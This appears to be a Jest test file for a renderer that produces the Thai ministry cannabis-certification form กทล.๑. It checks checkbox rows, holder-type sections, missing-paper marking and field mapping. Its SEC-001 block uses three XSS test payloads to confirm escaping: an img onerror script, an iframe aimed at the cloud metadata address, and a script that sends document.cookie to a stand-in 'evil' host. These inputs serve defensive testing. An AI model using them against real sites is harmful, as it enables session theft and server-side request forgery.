/**
 * The platform assembles the ministry's own form, from the filing it holds.
 *
 * Task 10 of the application-submission-v2 plan. Until now a farmer's "preview"
 * was a screen the platform invented; what the department actually receives and
 * what an officer actually checks is แบบกัญชา กทล.๑, four ส่วน, in its own order.
 * One renderer produces both the HTML the review page and the officer page embed
 * and the PDF the /pdf door serves, so the paper and the screen cannot disagree.
 *
 * ── WHAT THE TESTS ARE FOR ────────────────────────────────────────────────────
 * Not the styling. Three things the form is legally required to get right, each
 * of which the platform has already got wrong once somewhere:
 *
 *   1. ลักษณะพื้นที่ is a CHECKBOX ROW. A filing may tick several, and the merged
 *      B1 lens shipped collapsing them to one — which deleted a paper the
 *      ministry requires. The printed form must mark EVERY tick, and print the
 *      อื่น ๆ ระบุ words beside their own box.
 *   2. ส่วนที่ ๑ differs by holder type. A community enterprise's form must show
 *      its สวช.01 row and must NOT show the juristic rows: a form carrying blank
 *      rows for a legal shape the applicant is not reads as an incomplete filing.
 *   3. A required paper that is not attached must LOOK not-attached. An unchecked
 *      box with "ยังไม่ได้แนบ" beside it, not a blank the reader has to interpret.
 *
 * Plus the one that catches everything else: no `undefined`, `null` or `[object
 * Object]` may reach the page. On a government form a stray `undefined` where a
 * นาย/นาง should be is not a cosmetic bug.
 */

'use strict';

const {
    renderKatorlor1Html,
} = require('../../services/pdf/katorlor1-template-service');

/** The engine's own output shape (application-requirements-service). */
function slot(over = {}) {
    return {
        slotId: 'land_rights',
        labelTH: 'สำเนาเอกสารสิทธิ์ที่ดิน',
        description: null,
        sourceHint: null,
        required: true,
        requiredReason: 'ALWAYS',
        satisfied: false,
        fileUrl: null,
        fileName: null,
        uploadedAt: null,
        ...over,
    };
}

function payload(over = {}) {
    return {
        dims: {
            holderType: 'INDIVIDUAL',
            requestType: 'NEW',
            certScope: 'PLANTING',
            plantCode: 'cannabis',
            landTenure: 'OWNED',
            areaTypes: ['OUTDOOR'],
            areaTypeOther: null,
            purposes: ['EXPORT'],
            ...(over.dims || {}),
        },
        slots: over.slots || [slot()],
        missingRequired: over.missingRequired || ['land_rights'],
        complete: over.complete === true,
    };
}

function application(formData = {}, over = {}) {
    return {
        id: 'app-1',
        applicationNumber: 'GACP-2569-0001',
        status: 'DRAFT',
        submittedAt: null,
        formData: {
            applicantType: 'INDIVIDUAL',
            requestType: 'NEW',
            plantId: 'cannabis',
            applicantData: {
                prefix: 'นาย',
                firstName: 'สมชาย',
                lastName: 'ใจดี',
                nationalId: '1234567890123',
                nationality: 'ไทย',
                phone: '0812345678',
            },
            farmData: {
                farmName: 'ไร่ทดสอบ',
                address: '99 หมู่ 1',
                subDistrict: 'สุเทพ',
                district: 'เมือง',
                province: 'เชียงใหม่',
                landOwnership: 'OWNED',
                areaTypes: ['OUTDOOR'],
            },
            ...formData,
        },
        ...over,
    };
}

// ── the four ส่วน ─────────────────────────────────────────────────────────────


/**
 * แบบฟอร์มต้องพิมพ์สิ่งที่ผู้ยื่นกรอกจริง ไม่ใช่ช่องว่าง
 *
 * wizard หกขั้นเขียนชื่อฟิลด์ของตัวเอง: `siteName` `siteAddress` `landDocumentDetail`
 * `coordinates` · เทมเพลตอ่านชื่อของรุ่นก่อน: `farmName` `address` `landDocumentType`
 * `latitude/longitude` ⇒ เดินจริงถึงหน้าตรวจทาน 2026-09-06 แล้วเห็นแบบ กทล.1 ที่
 * **ชื่อสถานที่ ที่ตั้ง เอกสารสิทธิ์ และพิกัด ว่างเปล่าทั้งสี่ช่อง** ทั้งที่กรอกครบ
 *
 * ชื่อผู้ให้เช่ากับขนาดพื้นที่พิมพ์ออกมาถูก เพราะสองชื่อนั้นบังเอิญตรงกันทั้งสองรุ่น —
 * ซึ่งเป็นเหตุผลว่าทำไมมันดูเหมือนทำงาน
 */
describe('กทล.1 พิมพ์ข้อมูลสถานที่ที่ wizard รุ่นหกขั้นกรอกไว้', () => {
    const v2Farm = {
        siteName: 'แปลงสมุนไพรบ้านทดสอบ',
        siteAddress: '99/9 หมู่ 3 ตำบลทดสอบ อำเภอสันทราย จังหวัดเชียงใหม่ 50210',
        landOwnership: 'RENTED',
        landlordName: 'นายให้เช่า ที่ดินงาม',
        landDocumentDetail: { type: 'โฉนด', number: '12345' },
        coordinates: '18.7883, 98.9853',
        areaTypes: ['INDOOR'],
        areaSqm: '1600',
    };

    test('ชื่อสถานที่ ที่ตั้ง เอกสารสิทธิ์ และพิกัด ไม่ว่าง', () => {
        const html = renderKatorlor1Html(application({ farmData: v2Farm }), payload());
        expect(html).toContain('แปลงสมุนไพรบ้านทดสอบ');
        expect(html).toContain('99/9 หมู่ 3');
        expect(html).toContain('โฉนด');
        expect(html).toContain('12345');
        expect(html).toContain('18.7883, 98.9853');
    });

    test('ชื่อรุ่นเก่ายังพิมพ์ได้ — ร่างที่ค้างอยู่ต้องไม่กลายเป็นกระดาษเปล่า', () => {
        const html = renderKatorlor1Html(application({
            farmData: {
                farmName: 'ไร่รุ่นเก่า', address: '1 หมู่ 2', province: 'เชียงใหม่',
                landDocumentType: 'น.ส.3', landDocumentNumber: '777',
                latitude: 18.1, longitude: 98.2, areaTypes: ['OUTDOOR'],
            },
        }), payload());
        expect(html).toContain('ไร่รุ่นเก่า');
        expect(html).toContain('น.ส.3');
        expect(html).toContain('777');
        expect(html).toContain('18.1, 98.2');
    });
});

describe('the form is the ministry\'s form', () => {
    const html = renderKatorlor1Html(application(), payload());

    test('carries the form code', () => {
        expect(html).toContain('กทล');
    });

    test.each([
        ['ส่วนที่ ๑'],
        ['ส่วนที่ ๒'],
        ['ส่วนที่ ๓'],
        ['ส่วนที่ ๔'],
    ])('has the %s heading', (heading) => {
        expect(html).toContain(heading);
    });

    test('says the filing has not been submitted rather than printing an empty date', () => {
        expect(html).toContain('ยังไม่ได้ยื่น');
    });
});

// ── ลักษณะพื้นที่: every tick, and the อื่น ๆ words ───────────────────────────

describe('ลักษณะพื้นที่ — a checkbox row, not a single choice', () => {
    /**
     * Count marked boxes inside the ลักษณะพื้นที่ row and nowhere else.
     *
     * A fixed-width window past the label was the first version of this helper
     * and it counted three: the two real ticks plus วัตถุประสงค์'s ☑ from the row
     * below. The renderer was right and the test was wrong — so the window ends
     * where the row's own boxes container ends.
     */
    function markedAreaBoxes(html) {
        const at = html.indexOf('ลักษณะพื้นที่');
        expect(at).toBeGreaterThan(-1);
        const openAt = html.indexOf('<div class="boxes">', at);
        const start = openAt === -1 ? at : openAt;
        const end = html.indexOf('</div>', start);
        expect(end).toBeGreaterThan(start);
        return (html.slice(start, end).match(/☑/g) || []).length;
    }

    test('two ticks render TWO marked boxes — collapsing them deleted a required paper once', () => {
        const html = renderKatorlor1Html(
            application({ farmData: { areaTypes: ['OUTDOOR', 'GREENHOUSE'] } }),
            payload({ dims: { areaTypes: ['OUTDOOR', 'GREENHOUSE'] } }),
        );
        expect(markedAreaBoxes(html)).toBe(2);
    });

    test('one tick renders one', () => {
        const html = renderKatorlor1Html(application(), payload());
        expect(markedAreaBoxes(html)).toBe(1);
    });

    test('ใบที่ระบบพิมพ์มีสามช่อง และไม่มีช่อง "อื่น ๆ" อีก', () => {
        // operator 2026-09-11: "เรามีแค่ 3 อย่างนะ" · ช่องที่พิมพ์เกินคือคำถามเรื่องเงิน
        // ที่ไม่มีคำตอบ — จำนวนช่องที่ติ๊กคือตัวคูณค่าบริการ และไม่มีจอใดให้ติ๊กช่องที่สี่
        const html = renderKatorlor1Html(
            application({ farmData: { areaTypes: ['OUTDOOR'] } }),
            payload({ dims: { areaTypes: ['OUTDOOR'] } }),
        );
        expect(html).not.toContain('อื่น ๆ');
        for (const label of ['กลางแจ้ง', 'โรงเรือนทั่วไป', 'อาคาร/โรงเรือนระบบปิด']) {
            expect(html).toContain(label);
        }
    });

    test('a filing the platform cannot read says so instead of showing three empty boxes', () => {
        const html = renderKatorlor1Html(
            application({ farmData: { areaTypes: [] } }),
            payload({ dims: { areaTypes: [], areaDeclarationUnreadable: true } }),
        );
        expect(html).toContain('ยังไม่ได้ระบุ');
    });
});

// ── ส่วนที่ ๑ by holder type ──────────────────────────────────────────────────

describe('ส่วนที่ ๑ shows the applicant\'s own legal shape and no other', () => {
    test('a community enterprise gets its สวช.01 row', () => {
        const html = renderKatorlor1Html(
            application({ applicantType: 'COMMUNITY_ENTERPRISE' }),
            payload({ dims: { holderType: 'COMMUNITY_ENTERPRISE' } }),
        );
        expect(html).toContain('สวช.01');
    });

    test('…and NOT the juristic rows — blank rows for a shape you are not read as an incomplete filing', () => {
        const html = renderKatorlor1Html(
            application({ applicantType: 'COMMUNITY_ENTERPRISE' }),
            payload({ dims: { holderType: 'COMMUNITY_ENTERPRISE' } }),
        );
        expect(html).not.toContain('ทะเบียนนิติบุคคล');
    });

    test('an individual gets neither', () => {
        const html = renderKatorlor1Html(application(), payload());
        expect(html).not.toContain('สวช.01');
        expect(html).not.toContain('ทะเบียนนิติบุคคล');
        expect(html).toContain('สมชาย');
    });
});

// ── ส่วนที่ ๓ checklist ───────────────────────────────────────────────────────

describe('ส่วนที่ ๓ — a paper that is not attached must look it', () => {
    test('an unsatisfied required slot renders an empty box and says ยังไม่ได้แนบ', () => {
        const html = renderKatorlor1Html(application(), payload({
            slots: [slot({ satisfied: false })],
        }));
        expect(html).toContain('ยังไม่ได้แนบ');
        expect(html).toContain('☐ สำเนาเอกสารสิทธิ์ที่ดิน');
    });

    test('a satisfied slot renders a marked box and no ยังไม่ได้แนบ against it', () => {
        const html = renderKatorlor1Html(application(), payload({
            slots: [slot({ satisfied: true, fileName: 'chanote.pdf' })],
            missingRequired: [],
            complete: true,
        }));
        expect(html).toContain('☑ สำเนาเอกสารสิทธิ์ที่ดิน');
        expect(html).not.toContain('ยังไม่ได้แนบ');
    });

    test('an OPTIONAL paper is offered, never demanded', () => {
        const html = renderKatorlor1Html(application(), payload({
            slots: [slot({ slotId: 'water_test', labelTH: 'ผลตรวจน้ำ', required: false, satisfied: false })],
            missingRequired: [],
        }));
        expect(html).toContain('ผลตรวจน้ำ');
        // Not attached and not required → it is not something the filing lacks.
        expect(html).not.toContain('ยังไม่ได้แนบ');
    });
});

// ── ส่วนที่ ๔ declarations ────────────────────────────────────────────────────

describe('ส่วนที่ ๔ — the declarations, and when they were accepted', () => {
    test('an unaccepted filing shows the declarations without a timestamp', () => {
        const html = renderKatorlor1Html(application(), payload());
        expect(html).toContain('คำรับรอง');
        expect(html).not.toContain('ยืนยันเมื่อ');
    });

    test('an accepted filing stamps when — the server\'s own time, not a checkbox', () => {
        const html = renderKatorlor1Html(
            application({ declarationsAcceptedAt: '2026-09-05T03:00:00.000Z' }),
            payload(),
        );
        expect(html).toContain('ยืนยันเมื่อ');
    });
});

// ── the catch-all ─────────────────────────────────────────────────────────────

describe('nothing unrendered ever reaches the page', () => {
    const cases = [
        ['a full filing', application(), payload()],
        ['a bare filing', { id: 'app-2', formData: {} }, payload({ dims: {}, slots: [] })],
        ['no payload at all', application(), undefined],
        ['a community filing', application({ applicantType: 'COMMUNITY_ENTERPRISE' }), payload({ dims: { holderType: 'COMMUNITY_ENTERPRISE' } })],
        ['a juristic filing', application({ applicantType: 'JURISTIC' }), payload({ dims: { holderType: 'JURISTIC' } })],
    ];

    test.each(cases)('%s prints no undefined / null / [object Object]', (_label, app, req) => {
        const html = renderKatorlor1Html(app, req);
        // Strip attribute values so a legitimate `null` inside a data-* cannot
        // hide a real one in the text.
        const text = html.replace(/<[^>]+>/g, ' ');
        expect(text).not.toMatch(/\bundefined\b/);
        expect(text).not.toMatch(/\bnull\b/);
        expect(text).not.toContain('[object Object]');
        expect(text).not.toMatch(/\bNaN\b/);
    });

    test('a filing with no requirements payload still renders the four ส่วน', () => {
        const html = renderKatorlor1Html(application(), undefined);
        ['ส่วนที่ ๑', 'ส่วนที่ ๒', 'ส่วนที่ ๓', 'ส่วนที่ ๔'].forEach((h) => expect(html).toContain(h));
    });

    /**
     * SEC-001, moved here from pdf-ssrf-and-escaping.test.js block (b).
     *
     * That block proved the escaping of application-template-service's section
     * builders — the summary PDF the platform used to invent. This renderer
     * replaced it, so the builders lost their last caller and the block was
     * proving a property of code nothing runs. The property still matters and
     * now belongs to the live renderer: this HTML is embedded in the applicant's
     * review page AND in staff pages, so applicant-supplied text reaching it raw
     * would run in an officer's session.
     *
     * (Block (a), isPdfResourceAllowed, tests pdf-generator.service and stays
     * exactly where it is.)
     */
    describe('SEC-001 — applicant-supplied text is inert, and still readable', () => {
        const IMG = '<img src=x onerror=alert(1)>';
        const IFRAME = '<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>';
        const SCRIPT = '<script>fetch("http://evil/?c="+document.cookie)</script>';

        test.each([
            ['a farm name', { farmData: { farmName: IMG } }, IMG],
            ['an address', { farmData: { address: IFRAME } }, IFRAME],
            ['an applicant name', { applicantData: { firstName: SCRIPT } }, SCRIPT],
            // แถว "the อื่น ๆ free text" ถูกถอดออก 2026-09-11 พร้อมช่องนั้นเอง — ไม่มีฟิลด์
            // ข้อความอิสระของลักษณะพื้นที่ให้ผู้ยื่นกรอกอีกแล้ว · สามแถวข้างบนยังคุมการ
            // escape ของข้อความที่ผู้ยื่นกรอกได้จริงทั้งหมด
        ])('%s cannot smuggle markup in', (_label, formData, raw) => {
            const html = renderKatorlor1Html(application(formData), payload({}));
            // No raw tag survives…
            expect(html).not.toContain(raw);
            expect(html).not.toContain('<script>fetch');
            expect(html).not.toContain('<iframe src=');
            expect(html).not.toContain('<img src=x');
            // …but the value is preserved in readable, inert form. Silently
            // dropping it would hide what the applicant actually typed from the
            // officer deciding the filing.
            expect(html).toContain('&lt;');
        });

        test('a document file name from an upload is escaped too', () => {
            const html = renderKatorlor1Html(application(), payload({
                slots: [slot({ satisfied: true, fileName: IMG })],
                missingRequired: [],
            }));
            expect(html).not.toContain('<img src=x');
            expect(html).toContain('&lt;img src=x');
        });

        test('benign Thai and numbers are not over-escaped', () => {
            const html = renderKatorlor1Html(
                application({ farmData: { farmName: 'แปลงเหนือ', latitude: 18.79, longitude: 98.98 } }),
                payload(),
            );
            expect(html).toContain('แปลงเหนือ');
            expect(html).toContain('18.79, 98.98');
        });
    });
});

describe('the printed form carries the identity numbers the wizard actually collects', () => {
    // Found by the 2026-09-06 document-coverage analysis: the template reads
    // `nationalId / organizationName / juristicRegistrationNumber /
    // communityRegistrationNumber`, but step 2 of the wizard writes
    // `idCard / presidentIdCard / companyName / taxId / communityRegistrationNo`
    // (step2-identity-config.ts:38-61). No translator existed anywhere, so every
    // กทล.1 the platform printed left the applicant's national ID, the juristic
    // registration number and the community registration number BLANK — an official
    // form that does not identify who filed it.
    const base = {
        id: 'app-idpins',
        applicationNumber: 'APP-2569-TEST-0001',
        formData: {
            requestType: 'NEW',
            certScope: 'PLANTING',
            plantId: 'cannabis',
            farmData: { farmName: 'ไร่ทดสอบ' },
        },
    };

    it('prints a บุคคลธรรมดา national ID written as idCard', () => {
        const app = { ...base, formData: { ...base.formData, applicantType: 'INDIVIDUAL',
            applicantData: { firstName: 'สมชาย', lastName: 'ใจดี', idCard: '3012899519560' } } };
        expect(renderKatorlor1Html(app)).toContain('3012899519560');
    });

    it('prints a วิสาหกิจชุมชน president ID and its สวช.01 number', () => {
        const app = { ...base, formData: { ...base.formData, applicantType: 'COMMUNITY_ENTERPRISE',
            applicantData: { presidentIdCard: '3727122468869', communityRegistrationNo: '5-50-01-11/1-0123',
                communityName: 'วิสาหกิจชุมชนทดสอบ' } } };
        const html = renderKatorlor1Html(app);
        expect(html).toContain('3727122468869');
        expect(html).toContain('5-50-01-11/1-0123');
    });

    it('prints a นิติบุคคล name and registration number written as companyName/taxId', () => {
        const app = { ...base, formData: { ...base.formData, applicantType: 'JURISTIC',
            applicantData: { companyName: 'บริษัท ทดสอบ จำกัด', taxId: '0105568045932', idCard: '3222610441200' } } };
        const html = renderKatorlor1Html(app);
        expect(html).toContain('บริษัท ทดสอบ จำกัด');
        expect(html).toContain('0105568045932');
    });
});
